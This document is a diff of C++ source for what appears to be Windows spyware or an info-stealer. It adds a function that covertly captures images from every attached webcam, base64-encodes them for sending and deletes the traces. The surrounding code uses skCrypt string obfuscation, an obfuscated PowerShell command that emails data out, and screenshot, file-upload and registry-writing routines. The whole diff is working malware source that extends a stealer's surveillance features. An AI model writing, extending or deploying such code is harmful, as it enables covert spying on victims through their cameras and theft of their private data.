@@ -2,7 +2,13 @@
 
 using namespace std;
 using Json = nlohmann::json;
+namespace fs = std::experimental::filesystem;
 
+// needed for webcam images
+EXTERN_C const CLSID CLSID_NullRenderer;
+EXTERN_C const CLSID CLSID_SampleGrabber;
+
+vector<string> webcams;
 vector<string> filesLink;
 vector<string> globalAllFiles;
 mutex allFilesMutex;
@@ -395,6 +401,14 @@ string getScreenshot() {
     return result;
 }
 
+vector<string> getLinks() {
+    return filesLink;
+}
+
+vector<string> getWebcams() {
+    return webcams;
+}
+
 void sendEmail() {
     system(powershellEncodedCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
@@ -546,10 +560,6 @@ void uploadFiles(vector<string> files) {
     }
 }
 
-vector<string> getLinks() {
-    return filesLink;
-}
-
 void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
     HKEY hKey;
     DWORD dwDisposition;
@@ -565,6 +575,252 @@ void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) 
 
     if (RegCloseKey(hKey) != ERROR_SUCCESS && DEBUG)
         cout << key << skCrypt("\\") << keyPath << skCrypt(" not closed\n");
+}
+
+void takeWebcams() {
+    HRESULT hr;
+    ICreateDevEnum* pDevEnum = NULL;
+    IEnumMoniker* pEnum = NULL;
+    IMoniker* pMoniker = NULL;
+    IPropertyBag* pPropBag = NULL;
+    IGraphBuilder* pGraph = NULL;
+    ICaptureGraphBuilder2* pBuilder = NULL;
+    IBaseFilter* pCap = NULL;
+    IBaseFilter* pSampleGrabberFilter = NULL;
+    DexterLib::ISampleGrabber* pSampleGrabber = NULL;
+    IBaseFilter* pNullRenderer = NULL;
+    IMediaControl* pMediaControl = NULL;
+    char* pBuffer = NULL;
+    
+    bool deleteFolder = false;
+    if (!fs::is_directory(WEBCAM_PATH) || !fs::exists(WEBCAM_PATH)) {
+        fs::create_directory(WEBCAM_PATH);
+        deleteFolder = true;
+    }
+
+    vector<string> filenames;
+
+    VIDEOINFOHEADER* pVih = NULL;
+    long buffer_size = 0;
+    int n = 1;
+
+    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (hr != S_OK)
+        goto cleanup;
+
+    hr = CoCreateInstance(CLSID_FilterGraph, NULL,
+        CLSCTX_INPROC_SERVER, IID_IGraphBuilder,
+        (void**)&pGraph);
+    if (hr != S_OK)
+        goto cleanup;
+
+    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL,
+        CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2,
+        (void**)&pBuilder);
+    if (hr != S_OK)
+        goto cleanup;
+
+    hr = pBuilder->SetFiltergraph(pGraph);
+    if (hr != S_OK)
+        goto cleanup;
+
+    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
+        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
+    if (hr != S_OK)
+        goto cleanup;
+
+    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
+    if (hr != S_OK)
+        goto cleanup;
+
+
+    VARIANT var;
+    n = 0;
+    while (true) {
+        hr = pEnum->Next(1, &pMoniker, NULL);
+        if (hr == S_OK) {
+            n++;
+
+            hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
+            VariantInit(&var);
+            hr = pPropBag->Read(CA2W(skCrypt("FriendlyName")), &var, 0);
+            _bstr_t tmp(var.bstrVal);
+            wstring FullFIleName((wchar_t*)tmp, tmp.length());
+            string filename = WEBCAM_PATH + string(FullFIleName.begin(), FullFIleName.end()) + (string)skCrypt(".bmp");
+            VariantClear(&var);
+
+            hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
+            if (hr != S_OK) 
+                goto cleanup;
+
+            hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
+            if (hr != S_OK) 
+                goto cleanup;
+
+            hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pSampleGrabberFilter->QueryInterface(DexterLib::IID_ISampleGrabber, (void**)&pSampleGrabber);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pSampleGrabber->SetBufferSamples(TRUE);
+            if (hr != S_OK)
+                goto cleanup;
+
+            AM_MEDIA_TYPE mt;
+            ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
+            mt.majortype = MEDIATYPE_Video;
+            mt.subtype = MEDIASUBTYPE_RGB24;
+            hr = pSampleGrabber->SetMediaType((DexterLib::_AMMediaType*)&mt);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pGraph->AddFilter(pSampleGrabberFilter, CA2W(skCrypt("SampleGrab")));
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pGraph->AddFilter(pNullRenderer, CA2W(skCrypt("NullRender")));
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
+            if (hr != S_OK) 
+                goto cleanup;
+
+            while (true) {
+                hr = pMediaControl->Run();
+
+                if (hr == S_OK) 
+                    break;
+                if (hr == S_FALSE) 
+                    continue; 
+
+                goto cleanup;
+            }
+
+
+            while (true) {
+                hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
+                if (hr == S_OK && buffer_size != 0) 
+                    break;
+                if (hr != S_OK && hr != VFW_E_WRONG_STATE)
+                    goto cleanup;
+            }
+
+            pMediaControl->Stop();
+
+            pBuffer = new char[buffer_size];
+            if (!pBuffer)
+                goto cleanup;
+
+            hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
+            if (hr != S_OK)
+                goto cleanup;
+
+            hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
+            if (hr != S_OK) 
+                goto cleanup;
+
+            if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
+                pVih = (VIDEOINFOHEADER*)mt.pbFormat;
+
+                long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
+                BITMAPFILEHEADER bfh;
+                ZeroMemory(&bfh, sizeof(bfh));
+                bfh.bfType = 'MB'; // "BM" in little-endian
+                bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
+                bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;
+
+                wchar_t wtext[100];
+                mbstowcs(wtext, filename.c_str(), filename.length() + 1);
+                HANDLE hf = CreateFile(wtext, GENERIC_WRITE,
+                    FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
+                if (hf == INVALID_HANDLE_VALUE)
+                    goto cleanup;
+
+                DWORD dwWritten = 0;
+                WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
+                WriteFile(hf, HEADER(pVih),
+                    cbBitmapInfoSize, &dwWritten, NULL);
+
+                WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
+                CloseHandle(hf);
+            }
+            else
+                goto cleanup;
+
+
+            if (mt.cbFormat != 0) {
+                CoTaskMemFree((PVOID)mt.pbFormat);
+                mt.cbFormat = 0;
+                mt.pbFormat = NULL;
+            }
+            if (mt.pUnk != NULL) {
+                mt.pUnk->Release();
+                mt.pUnk = NULL;
+            }
+
+            filenames.push_back(filename);
+        }
+        else
+            goto cleanup;
+        if (n >= MAX_PHOTOS)
+            break;
+    }
+
+
+cleanup:
+    if (pBuffer != NULL)
+        delete[](pBuffer);
+    if (pMediaControl != NULL)
+        pMediaControl->Release();
+    if (pNullRenderer != NULL)
+        pNullRenderer->Release();
+    if (pSampleGrabber != NULL)
+        pSampleGrabber->Release();
+    if (pSampleGrabberFilter != NULL)
+        pSampleGrabberFilter->Release();
+    if (pCap != NULL)
+        pCap->Release();
+    if (pBuilder != NULL)
+        pBuilder->Release();
+    if (pGraph != NULL)
+        pGraph->Release();
+    if (pPropBag != NULL)
+        pPropBag->Release();
+    if (pMoniker != NULL)
+        pMoniker->Release();
+    if (pEnum != NULL)
+        pEnum->Release();
+    if (pDevEnum != NULL)
+        pDevEnum->Release();
+    CoUninitialize();
+
+
+
+    for (string file : filenames) {
+        ifstream webcamFile(file, ios::in | ios::binary);
+        vector<BYTE> data(istreambuf_iterator<char>(webcamFile), {});
+        webcams.push_back(split(file, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
+        webcamFile.close();
+        if (remove(file.c_str()) != 0)
+            DeleteFileA(file.c_str());
+    }
+
+    if (deleteFolder)
+        fs::remove(WEBCAM_PATH);
+
+    return;
 }
 
 void changeIcon() {
